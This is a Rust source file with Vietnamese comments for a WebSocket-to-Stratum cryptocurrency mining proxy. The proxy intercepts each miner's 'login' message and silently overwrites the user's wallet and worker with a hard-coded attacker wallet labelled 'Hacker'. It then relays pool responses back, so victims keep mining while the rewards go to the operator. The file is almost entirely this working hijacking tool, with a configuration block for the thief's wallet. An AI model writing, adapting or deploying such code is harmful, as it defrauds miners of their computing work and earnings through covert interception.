use std::{env, net::SocketAddr, sync::{Arc, atomic::{AtomicUsize, Ordering}}};
use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio_tungstenite::{
    accept_hdr_async, 
    tungstenite::{
        handshake::server::{Request, Response, ErrorResponse}, // Thêm ErrorResponse
        Message
    }
};
use futures_util::{SinkExt, StreamExt};
use serde_json::Value;
use base64::{Engine as _, engine::general_purpose};
use colored::*;

// ==========================================
// ⚙️ CẤU HÌNH (SỬA Ở ĐÂY)
// ==========================================
const LISTEN_ADDR: &str = "0.0.0.0:9000";

// Ví "Hacker" của bạn
const MY_WALLET: &str = "SC11rezQ11DLX63oNaZD3Z5ggonmtfyehVhyjb1bFeLMB7emmGhDodc268uvcT87HTYsqqi4mzkZmQB4xgNeBRCf84CCygp9vQ.PY";
const MY_WORKER: &str = "Worker_Rust_God";

// ==========================================

struct ProxyStats {
    shares_sent: AtomicUsize,
    shares_accepted: AtomicUsize,
    shares_rejected: AtomicUsize,
}

#[tokio::main]
async fn main() {
    // Khởi tạo Logger
    env::set_var("RUST_LOG", "info");
    env_logger::init();

    let stats = Arc::new(ProxyStats {
        shares_sent: AtomicUsize::new(0),
        shares_accepted: AtomicUsize::new(0),
        shares_rejected: AtomicUsize::new(0),
    });

    let listener = TcpListener::bind(LISTEN_ADDR).await.expect("Failed to bind port");
    println!("{} {}", "🚀 RUST PROXY ULTIMATE RUNNING ON".green().bold(), LISTEN_ADDR);
    println!("💰 Target Wallet: {}", MY_WALLET.yellow());

    while let Ok((stream, addr)) = listener.accept().await {
        let stats = stats.clone();
        tokio::spawn(handle_connection(stream, addr, stats));
    }
}

async fn handle_connection(stream: TcpStream, addr: SocketAddr, stats: Arc<ProxyStats>) {
    let target_pool = Arc::new(std::sync::Mutex::new(String::new()));
    let target_pool_clone = target_pool.clone();

    // --- FIX: Đổi kiểu trả về thành Result<Response, ErrorResponse> ---
    let callback_extract = move |req: &Request, response: Response| -> Result<Response, ErrorResponse> {
        let path = req.uri().path();
        let clean_path = if path.starts_with('/') { &path[1..] } else { path };
        
        // Thử giải mã Base64
        if let Ok(decoded) = general_purpose::STANDARD.decode(clean_path) {
            if let Ok(decoded_str) = String::from_utf8(decoded) {
                *target_pool_clone.lock().unwrap() = decoded_str;
            }
        }
        Ok(response)
    };

    let ws_stream = match accept_hdr_async(stream, callback_extract).await {
        Ok(ws) => ws,
        Err(_) => return, 
    };

    let pool_host_port = target_pool.lock().unwrap().clone();
    if pool_host_port.is_empty() {
        return; // Không tìm thấy pool trong URL
    }

    println!("{} {} -> {}", "🔌 Connected".blue(), addr, pool_host_port);

    // Kết nối tới Pool thật
    let tcp_pool = match TcpStream::connect(&pool_host_port).await {
        Ok(s) => s,
        Err(e) => {
            println!("{} Failed to connect pool: {}", "❌".red(), e);
            return;
        }
    };

    let (mut ws_write, mut ws_read) = ws_stream.split();
    let (mut pool_read, mut pool_write) = tcp_pool.into_split();

    // ====================================================
    // LUỒNG 1: MINER -> POOL (INTERCEPT & MODIFY)
    // ====================================================
    let stats_miner = stats.clone();
    let client_to_server = tokio::spawn(async move {
        while let Some(msg) = ws_read.next().await {
            match msg {
                Ok(Message::Text(text)) => {
                    // Tách dòng (Stratum support multiline)
                    for line in text.lines() {
                        if line.trim().is_empty() { continue; }

                        let mut final_msg = line.to_string();
                        
                        // Parse JSON để can thiệp
                        if let Ok(mut json) = serde_json::from_str::<Value>(line) {
                            if let Some(method) = json["method"].as_str() {
                                // 1. INTERCEPT LOGIN
                                if method == "login" {
                                    if let Some(params) = json.get_mut("params") {
                                        // Log ví cũ
                                        let old_login = params["login"].as_str().unwrap_or("???");
                                        println!("{} User: {} -> Me: {}", "🕵️ INTERCEPT:".yellow(), old_login, "SC1...".green());
                                        
                                        // Ghi đè
                                        params["login"] = serde_json::json!(MY_WALLET);
                                        params["pass"] = serde_json::json!(MY_WORKER);
                                        
                                        final_msg = json.to_string();
                                    }
                                }
                                // 2. COUNT SUBMIT
                                else if method == "submit" {
                                    stats_miner.shares_sent.fetch_add(1, Ordering::Relaxed);
                                }
                            }
                        }

                        // Thêm \n nếu thiếu (Bắt buộc cho Stratum TCP)
                        if !final_msg.ends_with('\n') {
                            final_msg.push('\n');
                        }

                        // Gửi lên Pool
                        if pool_write.write_all(final_msg.as_bytes()).await.is_err() {
                            return;
                        }
                    }
                }
                Ok(Message::Close(_)) => break,
                _ => {} // Bỏ qua Binary/Ping/Pong
            }
        }
    });

    // ====================================================
    // LUỒNG 2: POOL -> MINER (AUDIT & FORWARD)
    // ====================================================
    let stats_pool = stats.clone();
    let server_to_client = tokio::spawn(async move {
        let mut buffer = [0u8; 8192];
        loop {
            match pool_read.read(&mut buffer).await {
                Ok(0) => break, // EOF
                Ok(n) => {
                    let data = &buffer[0..n];
                    // Chuyển bytes sang string (lossy) để gửi qua WS và audit
                    let text = String::from_utf8_lossy(data);

                    // Audit kết quả
                    for line in text.lines() {
                        if let Ok(json) = serde_json::from_str::<Value>(line) {
                            // Check Result OK
                            if let Some(result) = json.get("result") {
                                if (result.is_object() && result["status"] == "OK") || result.as_bool() == Some(true) {
                                    let total = stats_pool.shares_accepted.fetch_add(1, Ordering::Relaxed) + 1;
                                    let sent = stats_pool.shares_sent.load(Ordering::Relaxed);
                                    println!("{} ({}/{})", "✅ SHARE ACCEPTED!".green().bold(), total, sent);
                                }
                            }
                            // Check Error
                            if !json["error"].is_null() {
                                let rejected = stats_pool.shares_rejected.fetch_add(1, Ordering::Relaxed) + 1;
                                println!("{} ({}) Reason: {:?}", "❌ SHARE REJECTED!".red().bold(), rejected, json["error"]);
                            }
                        }
                    }

                    // Gửi về Miner (WebSocket Text Frame)
                    if ws_write.send(Message::Text(text.to_string())).await.is_err() {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
    });

    // Chờ 1 trong 2 luồng kết thúc
    let _ = tokio::select! {
        _ = client_to_server => {},
        _ = server_to_client => {},
    };
    
    println!("{} {}", "💀 Disconnected".red(), addr);
}
